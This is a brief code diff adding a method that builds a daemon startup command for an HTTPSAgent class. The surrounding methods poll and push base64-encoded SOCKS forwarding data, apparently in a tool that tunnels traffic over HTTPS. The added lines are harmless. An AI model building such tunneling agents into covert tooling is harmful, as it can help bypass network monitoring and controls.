@@ -121,6 +121,10 @@ class HTTPSAgent(LocalAgent):
 			print("Oops, something went wrong, pollForward: {}".format(e), file=sys.stderr)
 			return None
 
+	def getDaemonStartupCmd(self):
+		definition_file = sys.executable + " " + self.getScriptName()
+		return definition_file.replace("Def.py", ".py")
+
 	def pushSocksForward(self, forwardID, data):
 		try:
 			im_b64 = base64.b64encode(data).decode('ascii')
